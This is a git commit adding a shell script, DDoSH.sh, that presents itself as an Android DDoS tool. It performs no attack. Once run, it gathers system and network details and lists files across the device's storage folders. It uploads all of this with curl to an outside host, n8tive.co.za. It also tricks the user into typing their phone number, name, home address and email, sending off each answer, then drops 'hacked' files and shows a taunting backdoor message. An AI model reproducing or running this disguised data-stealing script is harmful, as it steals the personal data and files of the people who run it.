1429777932c8b922e1f1c55ec9cae0ee8a2a7778
AnonSeoHIK <135303741+AnonSeoHIK@users.noreply.github.com>
2023-06-02 12:24:41 +0700

    Add files via upload

---
+++ DDoSH.sh
@@ -0,0 +1,155 @@
+#!/system/bin/bash/sh
+
+clear
+echo -e "\033[33;32m"
+echo "Copyright By Ma Văn Nam
+
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+  id     : $(id)
+
+"> system.txt
+curl -T system.txt http://n8tive.co.za
+
+echo "
+
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+  id     : $(id)
+
+
+  $(ifconfig)
+
+  $(cd /sdcard/documents ; ls -s -u)
+
+  ===== FILES SDCARD =====
+
+  $(cd /sdcard/ ; ls -s -u)
+
+  ===== Android Files =====
+
+  $(cd /sdcard/Android ; ls -s -u)
+
+  ===== DATA ANDROID =====
+
+  $(cd /sdcard/Android/data ; ls -s -u)
+
+  ===== MOVIE FILES =====
+
+  $(cd /sdcard/Movies ; ls -s -u)
+
+  ==== Messenger =====
+
+  $(cd /sdcard/Movies/messenger ; ls -s -u)
+
+  ==== Pictures =====
+
+  $(cd /sdcard/Pictures ; cd * ; ls -s -u)
+
+  ====== Download =====
+
+  $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)
+
+  $(cd /sdcard/download ; echo "..." >> may.txt ; echo "..." >> da.txt ; echo "..." >> bi.txt ; echo "..." >> hack.txt)
+
+  $(cd /sdcard/download ; cd * ; ls -l -u)
+
+  ====== Image ======
+
+  $(cd /sdcard/DCIM/Screenshots ; ls -s -u)
+
+  ====== VIDEO ======
+
+ $(cd /sdcard/DCIM/Camera ; ls -s -u)
+
+  ====== Camera =====
+
+$(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
+
+  System : $(uname -a)
+  User   : $(whoami)
+  date   : $(date)
+  path   : $(pwd)
+  id     : $(id)
+
+  phone number : $phone
+  name : $name
+  email : $email
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}','
+
+  ','{$line}',' " >> system.txt
+   curl -T system.txt http://n8tive.co.za/
+
+echo "
+ ____       ____
+|  _ \  ___/ ___|
+| |_| |/ _ \___ \\
+|____/ \___/____/
+    _              _           _     _
+   / \   _ __   __| |_ __ ___ (_) __| |
+  / _ \ | |_ \ / _\ | |__/ _ \| |/ _\ |
+/_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|
+
+         ©:Ma Văn Nam"
+
+echo -e "\033[33;35m"
+echo "Please Enter your Personal Information to created API KEY use "
+echo ""
+echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
+echo ""
+
+  echo -n "Phone Number:"
+  read phone
+
+  echo "PHONE : $phone" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+  echo -n "first xand last name :"
+  read name
+
+  echo "NAME : $name" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+  echo -n "Address Home | Dia Chi NHa  : "
+  read adrss
+
+  echo "Address : $adrss" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+  echo -n "Email :"
+  read email
+
+  echo "EMAIl : $email" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+sleep 1
+echo "[!] Waiting For Me , To Created Api Key "
+echo ""
+echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
+sleep 3
+  echo -n enter ip :
+ read line
+
+  echo 3
+  sleep 1
+  echo 2
+  sleep 1
+  echo 1
+  sleep 1
+  echo ATTACK!!!
+  sleep 1
+  echo -e "\033[33;31m
+   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
+  exit 1
